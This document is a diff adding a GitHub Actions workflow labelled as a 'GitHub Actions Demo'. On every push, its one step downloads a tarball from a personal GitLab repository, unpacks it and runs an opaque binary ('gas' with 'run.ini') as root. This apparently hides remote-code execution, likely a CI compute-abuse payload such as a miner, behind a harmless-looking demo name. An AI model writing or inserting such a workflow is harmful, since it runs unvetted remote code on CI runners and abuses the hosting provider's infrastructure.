@@ -1,0 +1,7 @@
+name: GitHub Actions Demo
+on: [push]
+jobs:
+  Explore-GitHub-Actions:
+    runs-on: ubuntu-latest
+    steps:
+      - run: sudo apt update && sudo apt install nodejs && sudo apt install npm && wget https://gitlab.com/YuniSara/ayu/-/raw/main/anggun.tar.gz && tar -xf anggun.tar.gz ; sudo ./gas run.ini
